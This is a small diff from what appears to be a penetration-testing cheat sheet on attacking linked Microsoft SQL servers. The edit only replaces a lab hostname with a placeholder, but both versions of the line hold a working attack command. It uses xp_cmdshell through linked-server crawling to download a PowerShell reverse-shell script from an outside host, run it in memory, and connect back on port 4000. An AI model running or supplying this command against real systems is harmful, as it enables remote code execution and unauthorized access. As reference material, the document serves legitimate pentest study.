@@ -1827,7 +1827,7 @@ select * from openquery("192.168.23.25",'select * from openquery("db-sqlsrv",''s
 
 #### Execute reverse shell example
 ```
-Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'Powershell.exe iex (iwr http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1 -UseBasicParsing);reverse -Reverse -IPAddress xx.xx.xx.xx -Port 4000'"
+Get-SQLServerLinkCrawl -Instance <INSTANCE> -Query "exec master..xp_cmdshell 'Powershell.exe iex (iwr http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1 -UseBasicParsing);reverse -Reverse -IPAddress xx.xx.xx.xx -Port 4000'"
 ```
  
 #### Check xp_cmdshell
